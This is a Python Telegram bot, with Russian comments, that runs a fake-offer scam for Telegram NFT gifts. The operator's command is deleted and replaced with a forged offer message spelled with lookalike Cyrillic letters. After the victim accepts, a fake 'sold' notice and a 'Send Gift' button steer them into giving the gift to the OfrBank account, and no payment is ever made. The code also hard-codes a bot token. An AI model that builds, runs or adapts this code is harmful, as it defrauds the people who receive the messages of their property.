import asyncio
import logging
import random
import re
import string
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.client.default import DefaultBotProperties
from aiogram.exceptions import TelegramRetryAfter, TelegramBadRequest, TelegramForbiddenError
from aiogram.types import (
    Message,
    CallbackQuery,
    BusinessConnection,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
)
from aiogram.enums import ParseMode

BOT_TOKEN = "8797110393:AAF69tXjTSRu1Ivc28W54m8bUmG2Ry0tOdM"

ADMIN_LOG_ID = 8751928501

EMOJI_STARS = "5920433463428650761"
EMOJI_GRAM = "5267445215773367585"
EMOJI_DECLINE_EN = "5774077015388852135"
EMOJI_ACCEPT = "5774022692642492953"
EMOJI_SOLD = "6032937473162614352" # ID эмодзи для успешной продажи

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger(__name__)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML),
)
dp = Dispatcher()

business_owner_ids: dict[str, int] = {}
offers: dict[str, dict] = {}

# ============================================================
# БАЗА БАНОВ (в памяти)
# ============================================================
banned_users: set[str] = set()

def is_banned(user_id: int, username: str | None) -> bool:
    if str(user_id) in banned_users:
        return True
    if username and f"@{username.lower()}" in banned_users:
        return True
    return False

def ban_user(identifier: str) -> str:
    ident = identifier.strip()
    if not ident:
        return "❌ Укажи @username или ID."
    
    if ident.isdigit() or (ident.startswith("-") and ident[1:].isdigit()):
        banned_users.add(ident)
        return f"✅ ID <code>{ident}</code> забанен."
    
    if ident.startswith("@"):
        ident = ident[1:]
    banned_users.add(f"@{ident.lower()}")
    return f"✅ @{ident} забанен."

def unban_user(identifier: str) -> str:
    ident = identifier.strip()
    if not ident:
        return "❌ Укажи @username или ID."
    
    if ident.isdigit() or (ident.startswith("-") and ident[1:].isdigit()):
        banned_users.discard(ident)
        return f"✅ ID <code>{ident}</code> разбанен."
    
    if ident.startswith("@"):
        ident = ident[1:]
    banned_users.discard(f"@{ident.lower()}")
    return f"✅ @{ident} разбанен."

# ============================================================
# ЛОГИРОВАНИЕ ОШИБОК
# ============================================================
def log_telegram_error(prefix: str, e: Exception, **ctx):
    ctx_str = " | ".join(f"{k}={v}" for k, v in ctx.items())

    if isinstance(e, TelegramRetryAfter):
        logger.error(f"[{prefix}] ⏳ FLOOD_WAIT retry_after={e.retry_after}s | {ctx_str}")
        return
    if isinstance(e, TelegramForbiddenError):
        logger.error(f"[{prefix}] 🚫 FORBIDDEN | {ctx_str} | {e}")
        return

    msg = str(e)
    if "PEER_FLOOD" in msg:
        logger.error(f"[{prefix}] 🚨 PEER_FLOOD | {ctx_str} | {msg}")
        return
    if isinstance(e, TelegramBadRequest):
        logger.error(f"[{prefix}] ⚠️ BAD_REQUEST | {ctx_str} | {msg}")
        return

    logger.error(f"[{prefix}] ❓ UNKNOWN | {ctx_str} | {type(e).__name__}: {e}")

# ============================================================
# ЛОГИ ДЛЯ АДМИНА
# ============================================================
def format_gift_name(slug: str, number: str) -> str:
    formatted_slug = re.sub(r'(?<!^)(?=[A-Z])', ' ', slug)
    return f"{formatted_slug} #{number}"

def get_log_text(data: dict, status: str) -> str:
    status_map = {
        "pending": ("⏳", "Отправлен", "Не принят"),
        "accepted": ("✅", "Принят", "Да"),
        "declined": ("❌", "Отклонён", "Нет"),
    }
    status_emoji, status_text, transferred_text = status_map.get(status, ("⏳", "Отправлен", "Не принят"))

    gift_name_str = format_gift_name(data['gift_slug'], data['gift_number'])
    gift_display = f'<a href="{data["link"]}"><b>{gift_name_str}</b></a>'

    if data["currency"] == "gram":
        emoji_id = EMOJI_GRAM
        emoji_char = "🪙"
        currency_name = "GRAM"
    else:
        emoji_id = EMOJI_STARS
        emoji_char = "⭐"
        currency_name = "Stars"
        
    emoji_tag = f'<tg-emoji emoji-id="{emoji_id}">{emoji_char}</tg-emoji>'

    return (
        f"<b>Оффер отправлен</b>\n\n"
        f"<b>Подарок:</b> {gift_display}\n"
        f"<b>Сумма:</b> {data['amount']}\n"
        f"<b>Валюта:</b> {emoji_tag} {currency_name}\n"
        f"<b>Отправил:</b> @{data['sender_username']} | {data['sender_id']}\n"
        f"<b>Владелец подарка:</b> Нет доступа\n"
        f"<b>Передан:</b> {transferred_text}\n\n"
        f"<b>Статус:</b> {status_emoji} {status_text}"
    )

def get_log_keyboard(data: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        inline_keyboard=[[InlineKeyboardButton(text="🎁 Ссылка на подарок", url=data["link"])]]
    )

async def send_log_to_admin(data: dict):
    try:
        msg = await bot.send_message(
            chat_id=ADMIN_LOG_ID,
            text=get_log_text(data, "pending"),
            reply_markup=get_log_keyboard(data),
            disable_web_page_preview=True,
        )
        data["log_msg_id"] = msg.message_id
    except Exception as e:
        logger.error(f"[admin-log] Не удалось отправить лог: {e}")

async def update_log_message(data: dict, status: str):
    if "log_msg_id" not in data:
        return
    try:
        await bot.edit_message_text(
            chat_id=ADMIN_LOG_ID,
            message_id=data["log_msg_id"],
            text=get_log_text(data, status),
            reply_markup=get_log_keyboard(data),
            disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"[admin-log] Не удалось обновить лог: {e}")

# ============================================================
# ПАРСИНГ
# ============================================================
def parse_nft_link(link: str):
    pattern = r"(?:https?://)?t\.me/nft/([A-Za-z]+)-(\d+)"
    m = re.search(pattern, link)
    if not m:
        return None
    slug = m.group(1)
    number = m.group(2)
    return f"https://t.me/nft/{slug}-{number}", slug, number

def parse_offer_command(text: str):
    parts = text.strip().split()
    if len(parts) < 3 or parts[0].lower() != "/delitpr":
        return None
    link = parts[1]
    amount = parts[2]
    if not amount.isdigit():
        return None

    currency = "stars"
    if len(parts) > 3:
        p3 = parts[3].lower()
        if p3 in ("stars", "gram"):
            currency = p3

    parsed = parse_nft_link(link)
    if not parsed:
        return None
    full_link, slug, number = parsed

    return {
        "link": full_link,
        "gift_slug": slug,
        "gift_number": number,
        "amount": amount,
        "currency": currency,
    }

# ============================================================
# ОТПРАВКА
# ============================================================
async def send_with_fallback(bc_id, chat_id, text, reply_markup=None):
    for attempt in range(1, 4):
        try:
            return await bot.send_message(
                chat_id=chat_id,
                text=text,
                reply_markup=reply_markup,
                business_connection_id=bc_id,
                disable_web_page_preview=False,
            )
        except TelegramRetryAfter as e:
            await asyncio.sleep(e.retry_after + 1)
        except TelegramBadRequest as e:
            if "PEER_FLOOD" in str(e):
                raise
            clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
            if reply_markup:
                for row in reply_markup.inline_keyboard:
                    for btn in row:
                        btn.icon_custom_emoji_id = None
            try:
                return await bot.send_message(
                    chat_id=chat_id,
                    text=clean_text,
                    reply_markup=reply_markup,
                    business_connection_id=bc_id,
                    disable_web_page_preview=False,
                )
            except Exception:
                if attempt == 3:
                    raise

async def edit_with_fallback(bc_id, chat_id, message_id, text, reply_markup=None):
    try:
        await bot.edit_message_text(
            business_connection_id=bc_id,
            chat_id=chat_id,
            message_id=message_id,
            text=text,
            reply_markup=reply_markup,
        )
        return True
    except TelegramBadRequest as e:
        if "message is not modified" in str(e):
            return True
        clean_text = re.sub(r"<tg-emoji[^>]*>(.*?)</tg-emoji>", r"\1", text)
        if reply_markup:
            for row in reply_markup.inline_keyboard:
                for btn in row:
                    btn.icon_custom_emoji_id = None
        try:
            await bot.edit_message_text(
                business_connection_id=bc_id,
                chat_id=chat_id,
                message_id=message_id,
                text=clean_text,
                reply_markup=reply_markup,
            )
            return True
        except Exception:
            return False

# ============================================================
# КОМАНДЫ АДМИНА
# ============================================================
@dp.message(F.text.startswith("/ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_LOG_ID:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Использование: <code>/ban @username</code> или <code>/ban 123456789</code>")
        return
    await message.answer(ban_user(parts[1]))

@dp.message(F.text.startswith("/unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_LOG_ID:
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("❌ Использование: <code>/unban @username</code> или <code>/unban 123456789</code>")
        return
    await message.answer(unban_user(parts[1]))

@dp.message(F.text == "/banlist")
async def cmd_banlist(message: Message):
    if message.from_user.id != ADMIN_LOG_ID:
        return
    if not banned_users:
        await message.answer("📭 Список банов пуст.")
        return
    text = "<b>🚫 Забаненные:</b>\n\n"
    for b in sorted(banned_users):
        text += f"• <code>{b}</code>\n"
    await message.answer(text)

# ============================================================
# БИЗНЕС-ХЭНДЛЕРЫ
# ============================================================
@dp.business_connection()
async def handle_business_connection(connection: BusinessConnection) -> None:
    business_owner_ids[connection.id] = connection.user.id
    logger.info(f"[BC] owner={connection.user.id} connection_id={connection.id}")

@dp.business_message(F.text.regexp(r"(?i)^/delitpr\s"))
async def handle_offer(message: Message) -> None:
    if not message.business_connection_id:
        return

    bc_id = message.business_connection_id

    sender_id = 0
    sender_username = None
    if message.from_user:
        sender_id = message.from_user.id
        sender_username = message.from_user.username

    # ===== ПРОВЕРКА НА БАН =====
    if is_banned(sender_id, sender_username):
        logger.warning(f"[ban] user {sender_id} (@{sender_username}) попытался кинуть оффер — забанен")
        try:
            await bot.delete_business_messages(
                business_connection_id=bc_id,
                message_ids=[message.message_id],
            )
        except Exception:
            pass

        ban_text = (
            "я забанен, причина: я хуесос\n\n"
            "хотел кинуть тебе фейк офер но меня забанили сори"
        )
        try:
            await bot.send_message(
                chat_id=message.chat.id,
                text=ban_text,
                business_connection_id=bc_id,
            )
        except Exception as e:
            log_telegram_error("ban-msg", e, chat_id=message.chat.id, bc_id=bc_id)
        return

    # ===== ПРОВЕРКА ПРАВ БИЗНЕС-БОТА =====
    try:
        connection = await bot.get_business_connection(business_connection_id=bc_id)
        # Проверяем права (Telegram отдает их в объекте connection)
        # Если хотя бы одного из этих прав нет, бот не сможет корректно работать
        if not connection.rights or not all([
            connection.rights.can_read_messages,
            connection.rights.can_reply,
            connection.rights.can_delete_sent_messages,
            connection.rights.can_delete_received_messages
        ]):
            logger.warning(f"[BC] У бота не хватает прав для {bc_id}")
            try:
                await bot.delete_business_messages(
                    business_connection_id=bc_id,
                    message_ids=[message.message_id],
                )
            except Exception:
                pass

            error_text = (
                f"<b>axegarov</b> | delitpr offers\n\n"
                f"отсутствует разрешения на отправку оффера. Проверьте настройку business бота.\n"
                f"dev: @OfrBank"
            )
            await bot.send_message(
                chat_id=message.chat.id,
                text=error_text,
                business_connection_id=bc_id,
            )
            return
    except Exception as e:
        # Если произошла ошибка при получении прав (например, бот не подключен), тоже выдаем ошибку
        logger.error(f"[BC] Ошибка получения прав: {e}")
        try:
            await bot.delete_business_messages(
                business_connection_id=bc_id,
                message_ids=[message.message_id],
            )
        except Exception:
            pass

        error_text = (
            f"<b>axegarov</b> | delitpr offers\n\n"
            f"отсутствует разрешения на отправку оффера. Проверьте настройку business бота.\n"
            f"dev: @OfrBank"
        )
        await bot.send_message(
            chat_id=message.chat.id,
            text=error_text,
            business_connection_id=bc_id,
        )
        return

    # ===== ПАРСИНГ =====
    data = parse_offer_command(message.text)
    if not data:
        return

    sender_name = "Unknown"
    if message.from_user:
        sender_name = message.from_user.full_name
        if not sender_username:
            sender_username = f"id{sender_id}"

    try:
        await bot.delete_business_messages(
            business_connection_id=bc_id,
            message_ids=[message.message_id],
        )
    except Exception:
        pass

    await asyncio.sleep(3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    gift_display = f'<a href="{data["link"]}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'

    text = (
        f"Usеr <b>{sender_name}</b> оffеrs уоu "
        f"<b>{amount_fmt}</b> {emoji} "
        f"fоr thе gift {gift_display}.\n\n"
        f"Тhе оffеr ls vаIid fоr <b>6 h. 0 min</b>.."
    )

    offer_id = uuid.uuid4().hex[:12]
    offers[offer_id] = {
        **data,
        "bc_id": bc_id,
        "chat_id": message.chat.id,
        "accepted": False,
        "sender_name": sender_name,
        "sender_username": sender_username or f"id{sender_id}",
        "sender_id": sender_id,
    }

    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Decline",
                    callback_data=f"dec:{offer_id}",
                    icon_custom_emoji_id=EMOJI_DECLINE_EN,
                ),
                InlineKeyboardButton(
                    text="Accept",
                    callback_data=f"acc:{offer_id}",
                    icon_custom_emoji_id=EMOJI_ACCEPT,
                ),
            ]
        ]
    )

    try:
        sent = await send_with_fallback(
            bc_id=bc_id,
            chat_id=message.chat.id,
            text=text,
            reply_markup=keyboard,
        )
        offers[offer_id]["msg_id"] = sent.message_id
        await send_log_to_admin(offers[offer_id])
    except Exception as e:
        log_telegram_error("offer-send", e, chat_id=message.chat.id, bc_id=bc_id)

@dp.callback_query(F.data.startswith("dec:"))
async def handle_decline(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"):
        try:
            await callback.answer()
        except Exception:
            pass
        return

    try:
        await callback.answer()
    except Exception:
        pass

    await asyncio.sleep(0.3)

    decline_text = (
        f'<tg-emoji emoji-id="{EMOJI_DECLINE_EN}">❌</tg-emoji> '
        f"Offer has been declined."
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=decline_text,
    )
    await update_log_message(data, "declined")

@dp.callback_query(F.data.startswith("acc:"))
async def handle_accept(callback: CallbackQuery) -> None:
    _, offer_id = callback.data.split(":", 1)
    data = offers.get(offer_id)
    if not data or data.get("accepted"):
        try:
            await callback.answer()
        except Exception:
            pass
        return

    data["accepted"] = True

    try:
        await callback.answer()
    except Exception:
        pass

    await asyncio.sleep(0.3)

    amount_fmt = f"{int(data['amount']):,}"
    gift_plain = f'{data["gift_slug"]}-{data["gift_number"]}'
    
    # Ссылка вынесена наверх для предпросмотра
    link_for_preview = data["link"]
    gift_display = f'<a href="{link_for_preview}"><b>{gift_plain}</b></a>'

    if data["currency"] == "gram":
        emoji = f'<tg-emoji emoji-id="{EMOJI_GRAM}">🪙</tg-emoji>'
        currency_word_upper = "GRАM"
        currency_word_lower = "GRАM"
    else:
        emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
        currency_word_upper = "Stаrs"
        currency_word_lower = "stаrs"
        
    sold_emoji = f'<tg-emoji emoji-id="{EMOJI_SOLD}">✨</tg-emoji>'

    buyer_username = data["sender_username"]
    buyer_link = f"https://t.me/{buyer_username}" if not str(buyer_username).startswith("id") else "https://t.me/OfrBanks" 
    # Примечание: если нет юзернейма, ссылка ведет на дева, но кнопка снизу строго на OfrBanks

    # Новый текст по твоему шаблону
    accept_text = (
        f"{sold_emoji} Gift <b>{gift_display}</b> hаs bееn suссеssfullу sоld fоr <b>{amount_fmt}</b> {emoji} <b>{currency_word_upper}</b>!\n\n"
        f"Tо соmрlеtе thе dеаl, trаnsfеr thе gift tо thе buуеr tо rесеivе уоur {currency_word_upper}\n\n"
        f"{link_for_preview}"
    )

    # Кнопка строго на OfrBanks
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="Send Gift",
                    url="tg://send_gift?to=OfrBank",
                )
            ]
        ]
    )

    await edit_with_fallback(
        bc_id=data["bc_id"],
        chat_id=data["chat_id"],
        message_id=data["msg_id"],
        text=accept_text,
        reply_markup=keyboard,
    )
    await update_log_message(data, "accepted")

async def main() -> None:
    logger.info("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
